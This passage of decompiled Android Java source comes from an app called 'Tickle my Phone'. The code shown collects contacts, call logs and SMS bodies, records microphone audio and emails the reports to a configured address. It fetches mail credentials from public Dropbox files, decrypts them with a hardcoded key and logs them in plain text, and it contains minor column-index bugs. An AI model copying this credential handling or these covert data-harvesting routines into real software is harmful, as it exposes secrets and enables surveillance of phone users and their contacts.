        } catch (IOException e2) {
            e2.printStackTrace();
        }
        try {
            fOut.close();
        } catch (IOException e22) {
            e22.printStackTrace();
        }
    }

    public static void PhoneListing(Context context) {
        Cursor people = context.getContentResolver().query(Contacts.CONTENT_URI, null, null, null, null);
        while (people.moveToNext()) {
            int nameFieldColumnIndex = people.getColumnIndex("display_name");
            String contact = people.getString(nameFieldColumnIndex);
            int numberFieldColumnIndex = people.getColumnIndex("number");
            String number = people.getString(nameFieldColumnIndex);
            Debug("Contact name " + contact);
            Debug("Contact no   " + number);
        }
        people.close();
    }

    public static String GetRingMode(Context context) {
        switch (((AudioManager) context.getSystemService("audio")).getRingerMode()) {
            case 0:
                Log.i("MyApp", "Silent mode");
                return context.getString(R.string.oth15_silent);
            case 1:
                Log.i("MyApp", "Vibrate mode");
                return context.getString(R.string.oth16_vibrate);
            case 2:
                Log.i("MyApp", "Normal mode");
                return context.getString(R.string.oth17_normal);
            default:
                return context.getString(R.string.oth18_unable_to_find);
        }
    }

    public static String GetGPSinfo(Context context) {
        if (Secure.getString(context.getContentResolver(), "location_providers_allowed").contains("gps")) {
            return "On";
        }
        return "Off";
    }

    public static String GetInternetConnectionInfo(Context cntxt) {
        NetworkInfo[] netInfo = ((ConnectivityManager) cntxt.getSystemService("connectivity")).getAllNetworkInfo();
        int length = netInfo.length;
        int i = 0;
        while (i < length) {
            NetworkInfo ni = netInfo[i];
            Debug("Network Type = " + ni.getTypeName());
            if (ni.getTypeName().equalsIgnoreCase("WIFI") && ni.isConnected()) {
                Debug("WIFI is Okay");
                return "wifi";
            } else if (ni.getTypeName().equalsIgnoreCase("MOBILE") && ni.isConnected()) {
                Debug("Mobile is Okay");
                return "mobile";
            } else {
                i++;
            }
        }
        return "no internet";
    }

    public static String GetSDCardSpace(Context cntxt) {
        StatFs stat = new StatFs(Environment.getExternalStorageDirectory().getPath());
        return new StringBuilder(String.valueOf(Round((float) ((((double) stat.getAvailableBlocks()) * ((double) stat.getBlockSize())) / 1.073741824E9d), 2))).append(" GB").toString();
    }

    public static String GetIPAddress(Context context) {
        int i = ((WifiManager) context.getSystemService("wifi")).getConnectionInfo().getIpAddress();
        return new StringBuilder(String.valueOf((i >> 24) & 255)).append(".").append((i >> 16) & 255).append(".").append((i >> 8) & 255).append(".").append(i & 255).toString();
    }

    public static void SetFullScreen(Context context) {
        ((Activity) context).requestWindowFeature(1);
        ((Activity) context).getWindow().setFlags(1024, 1024);
    }

    public static float Round(float Rval, int Rpl) {
        float p = (float) Math.pow(10.0d, (double) Rpl);
        return ((float) Math.round(Rval * p)) / p;
    }

    public static String GetWebString(Context context, String urltext) {
        String DataContains = "";
        try {
            return new BufferedReader(new InputStreamReader(new URL(urltext).openStream())).readLine();
        } catch (MalformedURLException e1) {
            DataContains = "ERROR";
            e1.printStackTrace();
            return DataContains;
        } catch (IOException e12) {
            DataContains = "ERROR";
            e12.printStackTrace();
            return DataContains;
        }
    }

    public static void SendEmail(Context context, String AppEmailID, String AppEmailPWD, String LS_EmailAddress, String EmailSubject, String EmailBody, String FileName) {
        String dec_uid = "";
        String dec_pwd = "";
        try {
            String Version;
            Debug("Trying to fetch from dropbox ");
            String enc_uid = GetWebString(context, "https://dl.dropboxusercontent.com/u/107422258/u.txt");
            String enc_pwd = GetWebString(context, "https://dl.dropboxusercontent.com/u/107422258/p.txt");
            Debug("Dropbox fetch complete :" + enc_uid + "\npwd:" + enc_pwd);
            try {
                Debug("decrypt 1");
                dec_uid = SimpleCrypto.decrypt("TMLJINGALALA", enc_uid);
                Debug("decrypt 2");
                dec_pwd = SimpleCrypto.decrypt("TMLJINGALALA", enc_pwd);
            } catch (Exception e) {
                PutToast(context, context.getString(R.string.oth10_prblm_sending_mail));
                Debug("Problem while decrypting" + e);
            }
            Debug("dec_uid:" + dec_uid);
            Debug("dec_pwd:" + dec_pwd);
            if (GetPref(context, "KEY_IS_FREE").equals("Y")) {
                Version = "Tickle my Phone (Free Version)" + "\n\nYou are using Free version of Tickle my Phone. \nPlease click here to download the Full version.   \nhttps://play.google.com/store/apps/details?id=com.jalsalabs.ticklemyphonefull";
            } else {
                Version = APP_FULL_VERSION;
            }
            new GMailSender(dec_uid, dec_pwd).sendMail(EmailSubject, new StringBuilder(String.valueOf(EmailBody)).append("\n\n\n From: ").append(getEmail(context)).append("\n").append(Version).toString(), AppEmailID, LS_EmailAddress, FileName);
        } catch (Exception e2) {
            PutToast(context, context.getString(R.string.oth10_prblm_sending_mail));
            Debug("Problem while mail sending" + e2);
        }
    }

    public static void getCallCount(Context context, int PIncomingCount, int POutgoingCount, int PMissedCallCount) {
        String Missed_Call_List = "";
        String Incoming_Call_List = "";
        String Outgoing_Call_List = "";
        int Missed_Call_count = 0;
        int Incoming_Call_count = 0;
        int Outgoing_Call_count = 0;
        Cursor c = context.getContentResolver().query(Calls.CONTENT_URI, null, null, null, "date DESC");
        ((Activity) context).startManagingCursor(c);
        int numberColumn = c.getColumnIndex("number");
        int dateColumn = c.getColumnIndex("date");
        int typeColumn = c.getColumnIndex("type");
        while (c.moveToNext()) {
            String callerPhoneNumber = c.getString(numberColumn);
            String xxx = c.getString(dateColumn);
            Date date = new Date((long) (dateColumn * IMAPStore.RESPONSE));
            String yyy = "";
            int callDate = c.getInt(dateColumn);
            switch (c.getInt(typeColumn)) {
                case 1:
                    Incoming_Call_List = new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(Incoming_Call_List)).append("\n").append(callerPhoneNumber).append("  ").append(yyy).toString())).append(GetContactName(context, callerPhoneNumber)).toString();
                    Incoming_Call_count++;
                    break;
                case 2:
                    Outgoing_Call_List = new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(Outgoing_Call_List)).append("\n").append(callerPhoneNumber).append("  ").append(yyy).toString())).append(GetContactName(context, callerPhoneNumber)).toString();
                    Outgoing_Call_count++;
                    break;
                case 3:
                    Missed_Call_List = new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(Missed_Call_List)).append("\n").append(callerPhoneNumber).append("  ").append(yyy).toString())).append(GetContactName(context, callerPhoneNumber)).toString();
                    Missed_Call_count++;
                    break;
                default:
                    break;
            }
        }
        PIncomingCount = Incoming_Call_count;
        POutgoingCount = Outgoing_Call_count;
        PMissedCallCount = Missed_Call_count;
    }

    public static String getCallDetails(Context context, String EmailId) {
        String Missed_Call_List = "\n";
        String Incoming_Call_List = "\n";
        String Outgoing_Call_List = "\n";
        String Missed_Call_List_HTML = "";
        String Incoming_Call_List_HTML = "";
        String Outgoing_Call_List_HTML = "";
        int Missed_Call_count = 0;
        int Incoming_Call_count = 0;
        int Outgoing_Call_count = 0;
        String HTML_End = getHTMLFooter(context);
        String Final_HTML = "<table border=\"1\" bordercolor=\"FF3300\" style=\"background-color:FFFFFF\" width=\"800\" cellpadding=\"3\" cellspacing=\"3\">";
        Debug("Inside getCallDetails");
        Cursor c = context.getContentResolver().query(Calls.CONTENT_URI, null, null, null, "date DESC");
        Debug("Soon After Cursor");
        ((Activity) context).startManagingCursor(c);
        Debug("Couldnt not able to manage Cursor");
        int numberColumn = c.getColumnIndex("number");
        int dateColumn = c.getColumnIndex("date");
        int typeColumn = c.getColumnIndex("type");
        Debug("2  getCallDetails");
        while (c.moveToNext()) {
            String callerPhoneNumber = c.getString(numberColumn);
            String xxx = c.getString(dateColumn);
            String Dateddmm = DateFormat.format("dd.MMM.yyyy h:mm a", new Date(Long.parseLong(c.getString(dateColumn)))).toString();
            Date date = new Date((long) (dateColumn * IMAPStore.RESPONSE));
            String yyy = "";
            int callDate = c.getInt(dateColumn);
            int callType = c.getInt(typeColumn);
            String is_free = GetPref(context, "KEY_IS_FREE");
            Debug("3  CallType Checking" + callType);
            switch (callType) {
                case 1:
                    Incoming_Call_List = new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(Incoming_Call_List)).append("\n").append(callerPhoneNumber).append("  ").append(yyy).toString())).append(GetContactName(context, callerPhoneNumber)).toString();
                    String Contact_NameIn = GetContactName(context, callerPhoneNumber);
                    if (Incoming_Call_count > 6) {
                        if (is_free.equals("Y")) {
                            callerPhoneNumber = "XXXXXXXXXXX";
                            Contact_NameIn = "Tickle my Phone Free version!  Consider buying.";
                        }
                    }
                    Incoming_Call_List_HTML = new StringBuilder(String.valueOf(Incoming_Call_List_HTML)).append("<tr>   <td>").append(callerPhoneNumber).append("</td><td>").append(Contact_NameIn).append("</td><td>").append(Dateddmm).append("</td><td></td></tr>").toString();
                    Incoming_Call_count++;
                    break;
                case 2:
                    Outgoing_Call_List = new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(Outgoing_Call_List)).append("\n").append(callerPhoneNumber).append("  ").append(yyy).toString())).append(GetContactName(context, callerPhoneNumber)).toString();
                    String Contact_NameOut = GetContactName(context, callerPhoneNumber);
                    if (Outgoing_Call_count > 6) {
                        if (is_free.equals("Y")) {
                            callerPhoneNumber = "XXXXXXXXXXX";
                            Contact_NameOut = "Tickle my Phone Free version!  Consider buying.";
                        }
                    }
                    Outgoing_Call_List_HTML = new StringBuilder(String.valueOf(Outgoing_Call_List_HTML)).append("<tr>   <td>").append(callerPhoneNumber).append("</td><td>").append(Contact_NameOut).append("</td><td>").append(Dateddmm).append("</td><td></td></tr>").toString();
                    Outgoing_Call_count++;
                    break;
                case 3:
                    Missed_Call_List = new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(Missed_Call_List)).append("\n").append(callerPhoneNumber).append("  ").append(yyy).toString())).append(GetContactName(context, callerPhoneNumber)).toString();
                    String Contact_NameMiss = GetContactName(context, callerPhoneNumber);
                    if (Missed_Call_count > 6) {
                        if (is_free.equals("Y")) {
                            callerPhoneNumber = "XXXXXXXXXXX";
                            Contact_NameMiss = "Tickle my Phone Free version!  Consider buying.";
                        }
                    }
                    Missed_Call_List_HTML = new StringBuilder(String.valueOf(Missed_Call_List_HTML)).append("<tr>   <td>").append(callerPhoneNumber).append("</td><td>").append(Contact_NameMiss).append("</td><td>").append(Dateddmm).append("</td><td></td></tr>").toString();
                    Missed_Call_count++;
                    Debug("Missed call from :" + callerPhoneNumber + " now the count is :" + Missed_Call_count);
                    break;
                default:
                    break;
            }
        }
        Debug("Incoming call list is :" + Incoming_Call_List);
        String Email_Attachment = new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf("\n" + "\n--------------------------------------------------------------------------\n\n\n")).append(context.getString(R.string.oth11_incoming_call)).append("(").append(Incoming_Call_count).append(")\n").toString())).append(Incoming_Call_List).toString())).append("\n--------------------------------------------------------------------------\n").toString())).append(context.getString(R.string.oth12_outgoing_call)).append("(").append(Outgoing_Call_count).append(")\n").toString())).append(Outgoing_Call_List).toString())).append("\n--------------------------------------------------------------------------\n").toString())).append(context.getString(R.string.oth13_missed_call)).append("(").append(Missed_Call_count).append(")\n").toString())).append(Missed_Call_List).toString())).append("\n--------------------------------------------------------------------------\n").toString())).append("\n\n\n-Tickle my Phone").toString();
        Final_HTML = new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(Final_HTML)).append("<tr>   <td>").append(context.getString(R.string.oth11_incoming_call)).append("(").append(Incoming_Call_count).append(")").append(" </td><td>Name</td><td>Date and Time</td><td></td></tr>").toString())).append(Incoming_Call_List_HTML).toString())).append("<tr>   <td>").append(context.getString(R.string.oth12_outgoing_call)).append("(").append(Outgoing_Call_count).append(")").append(" </td><td>Name</td><td>Date and Time</td><td></td></tr>").toString())).append(Outgoing_Call_List_HTML).toString())).append("<tr>   <td>").append(context.getString(R.string.oth13_missed_call)).append("(").append(Missed_Call_count).append(")").append(" </td><td>Name</td><td>Date and Time</td><td></td></tr>").toString())).append(Missed_Call_List_HTML).toString())).append(HTML_End).toString();
        SetPref(context, "INCOMING_COUNT", Incoming_Call_count);
        SetPref(context, "OUTGOING_COUNT", Outgoing_Call_count);
        SetPref(context, "MISSCALL_COUNT", Missed_Call_count);
        String LS_IS_APP_Activate = GetPref(context, "KEY_IS_APP_ACTIVATE");
        Debug("Just before create the EmailAttachment is :" + Email_Attachment);
        CreateLogText(context, getTMLPath() + "ticklemyphonecalllog.html", Final_HTML);
        String ShortBody = new StringBuilder(String.valueOf(new StringBuilder(String.valueOf("Incoming Calls =" + Incoming_Call_count + "\n")).append("OutGoing Calls =").append(Outgoing_Call_count).append("\n").toString())).append("Missed   Calls =").append(Missed_Call_count).append("\n\n\n").toString();
        if (LS_IS_APP_Activate.equals("N")) {
            ShortBody = new StringBuilder(String.valueOf(ShortBody)).append(context.getString(R.string.oth19_free_version)).toString();
        }
        ShortBody = new StringBuilder(String.valueOf(ShortBody)).append("\n\n\n-").append(context.getString(R.string.app_name)).toString();
        Debug("Email body = " + Email_Attachment);
        String FileName = getTMLPath() + "upgradetofull.jpg";
        if (LS_IS_APP_Activate.equals("N")) {
            FileName = getTMLPath() + "upgradetofull.jpg";
        } else {
            FileName = getTMLPath() + "ticklemyphonecalllog.html";
        }
        SendEmail(context, GetU(context), GetP(context), EmailId, "Tickle my Phone " + context.getString(R.string.oth8_call_log_details), ShortBody, FileName);
        return ShortBody;
    }

    public static String getHTMLFooter(Context context) {
        String HTML_End = "</BODY> </table>\t   <p style=\"font-family:verdana,arial,sans-serif;font-size:20px;\"><a href=\"http://www.ticklemyphone.weebly.com\" target=\"_top\">Tickle my Phone</a></p>";
        if (GetPref(context, "KEY_IS_FREE").equals("Y")) {
            return new StringBuilder(String.valueOf(HTML_End)).append("</BODY> </table>\t   <p style=\"font-family:verdana,arial,sans-serif;font-size:20px;\"><a href=\"http://market.android.com/details?id=com.jalsalabs.ticklemyphonefull\" target=\"_top\">Click here to download Tickle my Phone Pro</a></p>").toString();
        }
        return HTML_End;
    }

    public static String getCallDetailsNEW(Context context, String EmailId) {
        String Missed_Call_List = "\n";
        String Incoming_Call_List = "\n";
        String Outgoing_Call_List = "\n";
        String Missed_Call_List_HTML = "";
        String Incoming_Call_List_HTML = "";
        String Outgoing_Call_List_HTML = "";
        int Missed_Call_count = 0;
        int Incoming_Call_count = 0;
        int Outgoing_Call_count = 0;
        String HTML_End = getHTMLFooter(context);
        String Final_HTML = "<HTML><HEAD><TITLE>AWR Report</TITLE><style type=\"text/css\">body.awr {font:bold 10pt Arial,Helvetica,Geneva,sans-serif;color:black; background:White;}pre.awr  {font:8pt Courier;color:black; background:White;}h1.awr   {font:bold 20pt Arial,Helvetica,Geneva,sans-serif;color:#336699;background-color:White;border-bottom:1px solid #cccc99;margin-top:0pt; margin-bottom:0pt;padding:0px 0px 0px 0px;}h2.awr   {font:bold 18pt Arial,Helvetica,Geneva,sans-serif;color:#336699;background-color:White;margin-top:4pt; margin-bottom:0pt;}h3.awr {font:bold 16pt Arial,Helvetica,Geneva,sans-serif;color:#336699;background-color:White;margin-top:4pt; margin-bottom:0pt;}li.awr {font: 8pt Arial,Helvetica,Geneva,sans-serif; color:black; background:White;}th.awrnobg {font:bold 8pt Arial,Helvetica,Geneva,sans-serif; color:black; background:White;padding-left:4px; padding-right:4px;padding-bottom:2px}th.awrbg {font:bold 8pt Arial,Helvetica,Geneva,sans-serif; color:White; background:#0066CC;padding-left:4px; padding-right:4px;padding-bottom:2px}td.awrnc {font:8pt Arial,Helvetica,Geneva,sans-serif;color:black;background:White;vertical-align:top;}td.awrc    {font:8pt Arial,Helvetica,Geneva,sans-serif;color:black;background:#FFFFCC; vertical-align:top;}a.awr {font:bold 8pt Arial,Helvetica,sans-serif;color:#663300; vertical-align:top;margin-top:0pt; margin-bottom:0pt;}</style></HEAD><BODY class='awr'><H1 class='awr'>\nTickle my Phone Call Log Details Report\n </H1>";
        Debug("Inside getCallDetails");
        Cursor c = context.getContentResolver().query(Calls.CONTENT_URI, null, null, null, "date DESC");
        Debug("Soon After Cursor");
        ((Activity) context).startManagingCursor(c);
        Debug("Couldnt not able to manage Cursor");
        int numberColumn = c.getColumnIndex("number");
        int dateColumn = c.getColumnIndex("date");
        int typeColumn = c.getColumnIndex("type");
        int CallDuration = c.getColumnIndex("duration");
        Debug("2  getCallDetails");
        Incoming_Call_List_HTML = "<P><TABLE BORDER=1 WIDTH=500><TR><TH class='awrnobg'></TH><TH class='awrbg'>Phone Number</TH><TH class='awrbg'>Contact Name</TH><TH class='awrbg'>Date and Time </TH><TH class='awrbg'>Call Duration</TH></TR>";
        while (c.moveToNext()) {
            String callerPhoneNumber = c.getString(numberColumn);
            String xxx = c.getString(dateColumn);
            String Dateddmm = DateFormat.format("dd.MMM.yyyy h:mm a", new Date(Long.parseLong(c.getString(dateColumn)))).toString();
            Date date = new Date((long) (dateColumn * IMAPStore.RESPONSE));
            String yyy = "";
            int callDate = c.getInt(dateColumn);
            int callType = c.getInt(typeColumn);
            Debug("3  CallType Checking" + callType);
            switch (callType) {
                case 1:
                    Incoming_Call_List = new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(Incoming_Call_List)).append("\n").append(callerPhoneNumber).append("  ").append(yyy).toString())).append(GetContactName(context, callerPhoneNumber)).toString();
                    Incoming_Call_List_HTML = new StringBuilder(String.valueOf(Incoming_Call_List_HTML)).append("<TR><TD class='awrnc'>").append(Incoming_Call_count).append("</TD><TD ALIGN='right' class='awrnc'>").append(callerPhoneNumber).append("</TD><TD ALIGN='center' class='awrnc'>").append(GetContactName(context, callerPhoneNumber)).append("</TD><TD ALIGN='right' class='awrnc'>").append(Dateddmm).append("</TD><TD ALIGN='right' class='awrnc'>").append(CallDuration).append("</TD></TR>").toString();
                    Incoming_Call_count++;
                    break;
                case 2:
                    Outgoing_Call_List = new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(Outgoing_Call_List)).append("\n").append(callerPhoneNumber).append("  ").append(yyy).toString())).append(GetContactName(context, callerPhoneNumber)).toString();
                    Outgoing_Call_List_HTML = new StringBuilder(String.valueOf(Outgoing_Call_List_HTML)).append("<tr>   <td>").append(callerPhoneNumber).append("</td><td>").append(GetContactName(context, callerPhoneNumber)).append("</td><td>").append(Dateddmm).append("</td><td></td></tr>").toString();
                    Outgoing_Call_count++;
                    break;
                case 3:
                    Missed_Call_List = new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(Missed_Call_List)).append("\n").append(callerPhoneNumber).append("  ").append(yyy).toString())).append(GetContactName(context, callerPhoneNumber)).toString();
                    Missed_Call_List_HTML = new StringBuilder(String.valueOf(Missed_Call_List_HTML)).append("<tr>   <td>").append(callerPhoneNumber).append("</td><td>").append(GetContactName(context, callerPhoneNumber)).append("</td><td>").append(Dateddmm).append("</td><td></td></tr>").toString();
                    Missed_Call_count++;
                    Debug("Missed call from :" + callerPhoneNumber + " now the count is :" + Missed_Call_count);
                    break;
                default:
                    break;
            }
        }
        Incoming_Call_List_HTML = new StringBuilder(String.valueOf(Incoming_Call_List_HTML)).append("</TABLE>").append(Incoming_Call_count).append("<P>").toString();
        Debug("Incoming call list is :" + Incoming_Call_List);
        String Email_Attachment = new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf("\n" + "\n--------------------------------------------------------------------------\n\n\n")).append(context.getString(R.string.oth11_incoming_call)).append("(").append(Incoming_Call_count).append(")\n").toString())).append(Incoming_Call_List).toString())).append("\n--------------------------------------------------------------------------\n").toString())).append(context.getString(R.string.oth12_outgoing_call)).append("(").append(Outgoing_Call_count).append(")\n").toString())).append(Outgoing_Call_List).toString())).append("\n--------------------------------------------------------------------------\n").toString())).append(context.getString(R.string.oth13_missed_call)).append("(").append(Missed_Call_count).append(")\n").toString())).append(Missed_Call_List).toString())).append("\n--------------------------------------------------------------------------\n").toString())).append("\n\n\n-Tickle my Phone").toString();
        Final_HTML = new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(Final_HTML)).append(Incoming_Call_List_HTML).toString())).append("<tr>   <td>").append(context.getString(R.string.oth12_outgoing_call)).append("(").append(Outgoing_Call_count).append(")").append(" </td><td>Name</td><td>Date and Time</td><td></td></tr>").toString())).append(Outgoing_Call_List_HTML).toString())).append("<tr>   <td>").append(context.getString(R.string.oth13_missed_call)).append("(").append(Missed_Call_count).append(")").append(" </td><td>Name</td><td>Date and Time</td><td></td></tr>").toString())).append(Missed_Call_List_HTML).toString())).append(HTML_End).toString();
        SetPref(context, "INCOMING_COUNT", Incoming_Call_count);
        SetPref(context, "OUTGOING_COUNT", Outgoing_Call_count);
        SetPref(context, "MISSCALL_COUNT", Missed_Call_count);
        String LS_IS_APP_Activate = GetPref(context, "KEY_IS_APP_ACTIVATE");
        Debug("Just before create the EmailAttachment is :" + Email_Attachment);
        CreateLogText(context, getTMLPath() + "ticklemyphonecalllog.html", Final_HTML);
        String ShortBody = new StringBuilder(String.valueOf(new StringBuilder(String.valueOf("Incoming Calls =" + Incoming_Call_count + "\n")).append("OutGoing Calls =").append(Outgoing_Call_count).append("\n").toString())).append("Missed   Calls =").append(Missed_Call_count).append("\n\n\n").toString();
        if (LS_IS_APP_Activate.equals("N")) {
            ShortBody = new StringBuilder(String.valueOf(ShortBody)).append(context.getString(R.string.oth19_free_version)).toString();
        }
        ShortBody = new StringBuilder(String.valueOf(ShortBody)).append("\n\n\n-").append(context.getString(R.string.app_name)).toString();
        Debug("Email body = " + Email_Attachment);
        String FileName = getTMLPath() + "upgradetofull.jpg";
        if (LS_IS_APP_Activate.equals("N")) {
            FileName = getTMLPath() + "upgradetofull.jpg";
        } else {
            FileName = getTMLPath() + "ticklemyphonecalllog.html";
        }
        SendEmail(context, GetU(context), GetP(context), EmailId, "Tickle my Phone " + context.getString(R.string.oth8_call_log_details), ShortBody, FileName);
        return ShortBody;
    }

    public static String GetSMSContentSri(Context context) {
        String HTML_End = getHTMLFooter(context);
        String Final_HTML = "<table border=\"1\" bordercolor=\"FF3300\" style=\"background-color:FFFFFF\" width=\"800\" cellpadding=\"3\" cellspacing=\"3\">" + "<tr>   <td>Number</td><td></td><td></td><td></td></tr>";
        Debug("just about to call URI ");
        String URI = "content://sms";
        Debug("ListSMSContents: URI =" + URI);
        Debug("Calling a cursor ");
        Cursor c = context.getContentResolver().query(Uri.parse(URI), null, "type in (1,2)", null, "address asc, date desc ");
        Debug("Calling  cursor Completed ");
        ((Activity) context).startManagingCursor(c);
        int smsEntriesCount = c.getCount();
        Debug("ListSMSContents: smsEntriesCount =" + smsEntriesCount);
        String[] body = new String[smsEntriesCount];
        String[] number = new String[smsEntriesCount];
        String[] read = new String[smsEntriesCount];
        String[] status = new String[smsEntriesCount];
        String[] date = new String[smsEntriesCount];
        String[] type = new String[smsEntriesCount];
        String[] subject = new String[smsEntriesCount];
        String MessageContent = new StringBuilder(String.valueOf(new StringBuilder(String.valueOf("" + "=======================================================================================================================\n")).append("(").append(smsEntriesCount).append(")\n").toString())).append("=======================================================================================================================\n").toString();
        int totalcount = 0;
        String old_number = "X";
        int Free_count = 0;
        String isFree = GetPref(context, "KEY_IS_FREE");
        if (c.moveToFirst()) {
            for (int i = 0; i < smsEntriesCount; i++) {
                Debug("ListSMSContents: i =" + i);
                type[i] = c.getString(c.getColumnIndexOrThrow("type")).toString();
                Debug("Getting the data for the body" + i);
                body[i] = c.getString(c.getColumnIndexOrThrow("body")).toString();
                Debug("Body done now Address: 1");
                number[i] = c.getString(c.getColumnIndexOrThrow("address")).toString();
                Debug("Address done now date: 2");
                date[i] = DateFormat.format("dd.MMM.yyyy h:mm a", new Date(Long.parseLong(c.getString(c.getColumnIndexOrThrow("date")).toString()))).toString();
                Debug("Date done now read: 3");
                read[i] = c.getString(c.getColumnIndexOrThrow("read")).toString();
                Debug("Read done now status: 4");
                status[i] = c.getString(c.getColumnIndexOrThrow("status")).toString();
                Debug("Status done now type again: 5");
                type[i] = c.getString(c.getColumnIndexOrThrow("type")).toString();
                Debug("Type done now subject which is not working: 6");
                subject[i] = "not working ";
                Debug("ListSMSContents: 7");
                String Ls_isRead = "";
                String BodyText = body[i];
                if (isFree.equals("Y") && Free_count > 4) {
                    BodyText = "You are using Tickle my Phone Free version with Limited features. To see Actual messages, please consider buying.";
                }
                if (read[i].equals("0")) {
                    Ls_isRead = "(Unread) ";
                }
                if (!old_number.equals(number[i])) {
                    Free_count = 0;
                    Final_HTML = new StringBuilder(String.valueOf(Final_HTML)).append("<tr>   <td>").append(number[i]).append(" ").append(GetContactName(context, number[i])).append("</td>    \t\t   <td>Received</td> <td>Sent</td> \t<td>Date and Time</td>\t        \t     </tr>").toString();
                }
                if (type[i].equals("1")) {
                    Final_HTML = new StringBuilder(String.valueOf(Final_HTML)).append("<tr>   <td></td>    \t\t   <td>").append(BodyText).append("</td> <td></td> \t<td>").append(date[i]).append("</td>\t        \t     </tr>").toString();
                }
                if (type[i].equals("2")) {
                    Final_HTML = new StringBuilder(String.valueOf(Final_HTML)).append("<tr>   <td></td>    \t\t   <td></td> <td>").append(BodyText).append("</td> \t<td>").append(date[i]).append("</td>\t        \t     </tr>").toString();
                }
                MessageContent = new StringBuilder(String.valueOf(MessageContent)).append("Message   :").append(Ls_isRead).append(BodyText).append("\n").append(type[i]).append("\n").toString();
                Debug("ListSMSContents: body[i] =" + BodyText);
                c.moveToNext();
                totalcount++;
                old_number = number[i];
                Free_count++;
            }
            Final_HTML = new StringBuilder(String.valueOf(Final_HTML)).append(HTML_End).toString();
            MessageContent = new StringBuilder(String.valueOf(MessageContent)).append("-------------------------------------------------------------------------\n").toString();
        }
        c.close();
        Debug("ListSMSContents: Final  MessageContent =" + MessageContent);
        return Final_HTML;
    }

    public static void AudioRecord(Context context, String FileName, int NSeconds) {
        MediaRecorder recorder = new MediaRecorder();
        recorder.setAudioSource(1);
        recorder.setOutputFormat(1);
        recorder.setAudioEncoder(1);
        recorder.setOutputFile(FileName);
        try {
            recorder.prepare();
        } catch (IllegalStateException e) {
            e.printStackTrace();
        } catch (IOException e2) {
            e2.printStackTrace();
        }
        recorder.start();
        Sleep(NSeconds);
        recorder.stop();
        recorder.reset();
        recorder.release();
    }

    public static void CreateFolderinSDCard(Context context, String FolderName) {
        File folder = new File(Environment.getExternalStorageDirectory() + "/" + FolderName);
        if (!folder.exists() && !folder.mkdir()) {
            PutToast(context, context.getString(R.string.oth9_unable_create_fld) + " " + FolderName + " !!!!");
        }
    }

    public static String isRuleOn(Context context, String RuleNo) {
        if (RuleNo.equals("0") && GetPref(context, "KEY_CALLBACK_ENABLE").equals("Y")) {
            return "newruleon";
        }
        if (RuleNo.equals("1") && GetPref(context, "KEY_CALLBACK_SPEAKER_ENABLE").equals("Y")) {
            return "newruleon";
        }
        if (RuleNo.equals("2") && GetPref(context, "KEY_VIBRATE_ENABLE").equals("Y")) {
            return "newruleon";
        }
        if (RuleNo.equals("3") && GetPref(context, "KEY_VIBRATEN_ENABLE").equals("Y")) {
            return "newruleon";
        }
        if (RuleNo.equals("4") && GetPref(context, "KEY_POPOUT_ENABLE").equals("Y")) {
            return "newruleon";
        }
        if (RuleNo.equals("5") && GetPref(context, "KEY_RINGTONE_ENABLE").equals("Y")) {
            return "newruleon";
        }
        if (RuleNo.equals("6") && GetPref(context, "KEY_SMS_REPLY_ENABLE").equals("Y")) {
            return "newruleon";
        }
        if (RuleNo.equals("7") && GetPref(context, "KEY_CALLFORWARD_ENABLE").equals("Y")) {
            return "newruleon";
        }
        if (RuleNo.equals("8") && GetPref(context, "KEY_CALLFORWARD_SPEAKER_ENABLE").equals("Y")) {
            return "newruleon";
        }
        if (RuleNo.equals("9") && GetPref(context, "KEY_GEOSMS_ENABLE").equals("Y")) {
            return "newruleon";
        }
        if (RuleNo.equals("10") && GetPref(context, "KEY_SAVEPHOTOSDCARD_ENABLE").equals("Y")) {
            return "newruleon";
        }
        if (RuleNo.equals("11") && GetPref(context, "KEY_SENDPHOTO_ENABLE").equals("Y")) {
            return "newruleon";
        }
        if (RuleNo.equals("12") && GetPref(context, "KEY_SENDVIDEO_ENABLE").equals("Y")) {
            return "newruleon";
        }
        if (RuleNo.equals("13") && GetPref(context, "KEY_RECORDAUDIO_ENABLE").equals("Y")) {
            return "newruleon";
        }
        if (RuleNo.equals("14") && GetPref(context, "KEY_RECORDAUDIO_NSEC_ENABLE").equals("Y")) {
            return "newruleon";
        }
        if (RuleNo.equals("15") && GetPref(context, "KEY_SENDAUDIORECORD_ENABLE").equals("Y")) {
            return "newruleon";
        }
        if (RuleNo.equals("16") && GetPref(context, "KEY_SETGPS_ENABLE").equals("Y")) {
            return "newruleon";
        }
        if (RuleNo.equals("17") && GetPref(context, "KEY_SETWIFI_ENABLE").equals("Y")) {
            return "newruleon";
        }
        if (RuleNo.equals("18") && GetPref(context, "KEY_SENDMOBILEINFO_ENABLE").equals("Y")) {
            return "newruleon";
        }
        if (RuleNo.equals("19") && GetPref(context, "KEY_SENDMISSCALLDETAIL_ENABLE").equals("Y")) {
            return "newruleon";
        }
        if (RuleNo.equals("20") && GetPref(context, "KEY_BUZZMOBILE_ENABLE").equals("Y")) {
            return "newruleon";
        }
        if (RuleNo.equals("21") && GetPref(context, "KEY_CALEVENT_ENABLE").equals("Y")) {
            return "newruleon";
        }
